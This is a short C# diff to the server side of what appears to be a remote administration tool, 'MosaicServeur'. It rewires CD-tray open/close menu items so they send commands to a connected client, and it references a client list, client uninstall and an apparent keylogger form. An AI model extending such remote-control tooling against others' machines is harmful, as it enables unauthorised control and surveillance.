@@ -32,7 +32,6 @@ namespace MosaicServeur.Main
         }
 
         // MANAGE Event
-
         private void UninstallClientMenuItem(object sender, RoutedEventArgs e)
         {
             if (lvClients.Items.Count != 0)
@@ -155,6 +154,20 @@ namespace MosaicServeur.Main
                 frmKl.ShowDialog();
                 frmKl.Focus();
             }
+        }
+
+        //Fun Functions
+        private void openCDMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (getClient() != null)
+            {
+                new MosaiqueServeur.Packets.ServerPackets.DoTrayCdOpenClose(true).Execute(getClient());
+            }
+        }
+
+        private void closeCDMenuItem(object sender, RoutedEventArgs e)
+        {
+            new MosaiqueServeur.Packets.ServerPackets.DoTrayCdOpenClose(false).Execute(getClient());
         }
 
         /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
@@ -326,22 +339,6 @@ namespace MosaicServeur.Main
         public static int connectedClients()
         {
             return clientsCount;
-        }
-
-        private void openCDMenuItem(object sender, RoutedEventArgs e)
-        {
-            int ret = mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
-        }
-
-        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
-        protected static extern int mciSendString(string lpstrCommand,
-                                                    StringBuilder lpstrReturnString,
-                                                    int uReturnLength,
-                                                    IntPtr hwndCallback);
-
-        private void closeCDMenuItem(object sender, RoutedEventArgs e)
-        {
-
         }
     }    
 }
